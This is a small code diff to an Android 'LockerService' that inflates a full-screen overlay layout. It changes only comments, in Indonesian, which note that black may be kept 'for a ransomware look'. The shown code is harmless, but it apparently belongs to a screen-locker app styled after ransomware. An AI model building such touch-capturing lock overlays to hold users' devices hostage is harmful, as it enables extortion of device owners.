@@ -155,8 +155,9 @@ public class LockerService extends Service {
         lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
 
         lockerLayout.setFitsSystemWindows(false);
-        // Memastikan background layout menutupi seluruh layar dan menangkap touch
-        lockerLayout.setBackgroundColor(0xFF000000); 
+        // Ubah dari hitam pekat (0xFF000000) ke warna yang lebih soft jika ingin menghindari kesan dark mode paksa
+        // Atau tetap hitam jika ini memang untuk ransomware look
+        lockerLayout.setBackgroundColor(0xFF000000);
 
         applyFullScreen();
 
